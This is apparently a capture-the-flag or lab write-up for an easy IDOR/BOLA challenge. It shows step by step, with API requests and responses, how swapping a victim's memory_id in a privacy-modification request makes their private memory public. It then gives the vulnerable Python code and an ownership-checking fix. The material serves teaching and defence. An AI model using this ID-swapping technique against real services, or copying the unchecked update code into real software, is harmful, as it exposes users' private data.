# Broken Object Level Authorization (IDOR) - Modify Another User's Memory Privacy

## Difficulty

Easy

---

## Goal

Make another user's **private memory** become **public** by abusing the privacy modification API.

---

## Application Overview

The application contains four major features.

- Login
- Victim Profile
- Attacker Profile
- Global Feed

The Global Feed only displays memories marked as **public**.

---

## Step 1 - Observe the Global Feed

Initially, only public memories are visible.

![Global Feed](images/01-global-feed.png)

---

## Step 2 - Login

Login using the attacker account.

```
Username: attacker_user
Password: password123
```

The application returns a JWT cookie after successful authentication.

![Login](images/02-login.png)

---

## Step 3 - Upload a Memory

Navigate to **My Profile**.

Upload any image (or URL depending on implementation).

Request

POST

```
POST /api/memories/upload
```

Body

```json
{
    "content_url":"com.com"
}
```

Response

```json
{
    "memory_id":"ffc95c29-5480-4f85-9033-9779f9aec701",
    "message":"Memory uploaded successfully (Private by default)"
}
```

Notice that the server returns a **memory_id**.

![Upload Memory](images/03-upload-memory.png)

---

## Step 4 - Inspect Your Profile

Refresh your profile.

```
GET /api/profile/attacker_user
```

The response contains

```json
{
    "memory_id":"ffc95c29-5480-4f85-9033-9779f9aec701",
    "privacy":0
}
```

At this point we learn two important things.

- Every memory has a unique identifier.
- The API exposes the privacy state.

This suggests there may be another endpoint responsible for changing privacy.

![Profile Response](images/04-profile-response.png)

---

## Step 5 - Locate Privacy Modification Endpoint

Capture the request while changing your own memory from Private → Public.

```
POST /api/privacy/modify
```

Request

```json
{
    "memory_id":"ffc95c29-5480-4f85-9033-9779f9aec701",
    "type":1
}
```

The server updates the privacy successfully.

![Privacy Request](images/05-privacy-request.png)

---

## Step 6 - Obtain Victim Memory ID

Login as the victim.

Navigate to the victim profile.

Locate the victim's private memory and copy its **memory_id**.

Logout.

---

## Step 7 - Exploit

Login back as the attacker.

Intercept the privacy modification request.

Replace

```json
{
    "memory_id":"YOUR_MEMORY_ID"
}
```

with

```json
{
    "memory_id":"VICTIM_MEMORY_ID"
}
```

Forward the request.

The server responds

```json
{
    "message":"Privacy updated successfully"
}
```

The request succeeds even though the attacker does not own the memory.

---

## Step 8 - Verify

Visit the Global Feed.

The victim's private memory is now publicly visible.

This confirms the vulnerability.

![Exploit Success](images/06-exploit-success.png)

---

# Root Cause

The server trusts the client-supplied **memory_id** without verifying ownership.

A simplified vulnerable implementation looks like:

```python
memory = Memory.query.get(memory_id)

memory.privacy = request.json["type"]

db.session.commit()
```

The server updates any memory matching the supplied ID.

---

# Secure Implementation

The server must verify ownership before modifying the object.

```python
memory = Memory.query.filter_by(
    id=memory_id,
    owner=current_user.id
).first()

if not memory:
    abort(403)

memory.privacy = request.json["type"]

db.session.commit()
```

---

# Impact

An attacker can

- Modify another user's privacy settings
- Expose private memories
- Leak confidential images
- Break authorization boundaries

---

# Vulnerability

**Broken Object Level Authorization (BOLA)**

Also known as

**Insecure Direct Object Reference (IDOR)**

---

# Key Takeaway

Never trust object identifiers supplied by the client.

Authentication only identifies **who** the user is.

Authorization determines **what** that user is allowed to modify.

Every operation that accepts an object identifier must verify ownership or permissions before performing the action.
